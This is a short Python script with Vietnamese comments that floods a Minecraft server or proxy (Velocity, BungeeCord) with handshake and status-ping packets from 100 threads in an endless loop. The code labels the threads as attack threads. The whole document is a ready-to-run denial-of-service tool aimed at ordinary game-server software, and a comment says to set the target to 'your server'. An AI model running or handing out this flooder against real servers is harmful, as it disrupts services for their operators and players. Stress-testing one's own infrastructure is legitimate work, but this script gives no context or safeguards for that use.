
import socket
import threading
import random
import time

# ⚙️ Cấu hình
SERVER_IP = '127.0.0.1'     # Thay đổi thành IP máy chủ của bạn
SERVER_PORT = 25565         # Cổng của proxy (Xcord / Velocity / BungeeCord)
THREADS = 100               # Số luồng chạy song song
DELAY = 0.01                # Thời gian nghỉ giữa mỗi packet gửi (giảm xuống nếu muốn tăng tần suất)

def send_status_ping():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((SERVER_IP, SERVER_PORT))

        # Gửi handshake (Minecraft protocol version 71 = 1.9)
        protocol_version = b'\x47'
        ip = SERVER_IP.encode('utf-8')
        port = SERVER_PORT.to_bytes(2, byteorder='big')
        state = b'\x01'

        ip_length = len(ip).to_bytes(1, byteorder='big')
        handshake_data = b'\x00' + protocol_version + ip_length + ip + port + state
        handshake_packet = len(handshake_data).to_bytes(1, byteorder='big') + handshake_data
        s.send(handshake_packet)

        # Gửi status request (giống như ping trong tab Multiplayer)
        request_data = b'\x00'
        request_packet = len(request_data).to_bytes(1, byteorder='big') + request_data
        s.send(request_packet)

        s.close()
    except:
        pass

def attack_loop():
    while True:
        send_status_ping()
        time.sleep(DELAY)

# 🚀 Khởi động các thread tấn công
for _ in range(THREADS):
    threading.Thread(target=attack_loop, daemon=True).start()

# Chạy không dừng
while True:
    time.sleep(100)
